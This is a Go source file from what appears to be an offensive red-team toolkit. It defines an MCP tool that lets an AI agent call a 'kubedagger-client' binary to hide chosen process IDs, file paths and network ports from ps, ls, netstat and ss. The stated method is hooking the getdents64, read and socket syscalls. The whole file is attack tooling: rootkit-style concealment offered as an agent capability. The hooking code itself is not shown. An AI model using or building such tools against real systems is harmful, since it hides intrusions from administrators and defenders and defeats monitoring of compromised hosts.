package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type SyscallBypassInput struct {
	HidePids  string `json:"hide_pids,omitempty"`
	HideFiles string `json:"hide_files,omitempty"`
	HidePorts string `json:"hide_ports,omitempty"`
}

type SyscallBypassTool struct {
	exec executor.Executor
}

func NewSyscallBypass(exec executor.Executor) *SyscallBypassTool {
	return &SyscallBypassTool{exec: exec}
}

func (t *SyscallBypassTool) Name() string { return "kubedagger_syscall_bypass" }

func (t *SyscallBypassTool) Description() string {
	return "Hide processes, files, and network connections from system tools by hooking getdents64, read, and socket syscalls. Makes specified resources invisible to ps, ls, netstat, and other inspection tools."
}

func (t *SyscallBypassTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"hide_pids": {
				"type": "string",
				"description": "Comma-separated list of PIDs to hide (e.g. '1234,5678')"
			},
			"hide_files": {
				"type": "string",
				"description": "Comma-separated list of file paths to hide from directory listings"
			},
			"hide_ports": {
				"type": "string",
				"description": "Comma-separated list of ports to hide from netstat/ss"
			}
		}
	}`)
}

func (t *SyscallBypassTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input SyscallBypassInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validatePIDList(input.HidePids); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.HideFiles, "hide_files"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.HidePorts, "hide_ports"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"syscall-bypass"}
	if input.HidePids != "" {
		args = append(args, "--hide-pids", input.HidePids)
	}
	if input.HideFiles != "" {
		args = append(args, "--hide-files", input.HideFiles)
	}
	if input.HidePorts != "" {
		args = append(args, "--hide-ports", input.HidePorts)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger syscall-bypass failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Syscall Bypass\n\n")
	if output == "" {
		sb.WriteString("Hiding active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
